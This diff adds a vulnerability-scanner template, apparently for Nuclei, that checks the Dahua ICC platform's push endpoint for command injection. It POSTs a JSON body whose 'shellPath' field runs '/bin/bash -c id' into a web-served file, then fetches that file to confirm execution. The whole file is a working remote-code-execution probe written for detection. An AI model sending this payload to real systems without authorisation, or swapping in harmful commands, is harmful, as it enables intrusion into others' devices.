@@ -1,0 +1,66 @@
+id: poc-yaml-dahua-icc-push-command-injection
+info:
+  name: Dahua ICC Intelligent IoT Integrated Management Platform Push Command Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+variables:
+  filename: "{{rand_base(5)}}"
+http:
+  - id: push-command-injection
+    method: POST
+    path:
+      - "{{BaseURL}}/evo-runs/v1.0/push"
+    headers:
+      Content-Type: application/json
+      X-Subject-Headerflag: ADAPT
+    body: |
+      {
+        "method": "agent.ossm.mapping.config",
+        "info": {
+          "configure": "abcd",
+          "filePath": "haha",
+          "paramMap": {
+            "shellPath": "/bin/bash -c id>/opt/evoWpms/static/{{filename}}.txt",
+            "filePath": "abc"
+          },
+          "requestIp": ""
+        }
+      }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+      - type: word
+        part: header
+        words:
+          - evo-runs
+      - type: word
+        part: header
+        words:
+          - application/json
+
+  - id: verify-command-result
+    method: GET
+    path:
+      - "{{BaseURL}}/static/{{filename}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
